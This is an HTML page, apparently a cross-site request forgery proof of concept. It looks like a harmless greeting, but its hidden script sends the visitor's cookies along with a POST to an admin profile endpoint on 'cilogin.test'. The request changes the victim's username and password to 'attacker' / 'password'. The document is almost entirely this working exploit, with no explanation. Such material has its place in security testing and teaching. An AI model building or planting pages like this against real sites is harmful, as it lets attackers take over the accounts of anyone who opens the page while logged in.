<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Hello, World!</title>
</head>
<body>
	Hello, how are you ?
	<script>
		var xhr = new XMLHttpRequest();
		xhr.open("POST", "http://cilogin.test/index.php/admin/profile", true);
		xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		xhr.withCredentials = true;
		var body = "name=attacker&username=attacker&password=password";
		xhr.send(body);
	</script>
</body>
</html>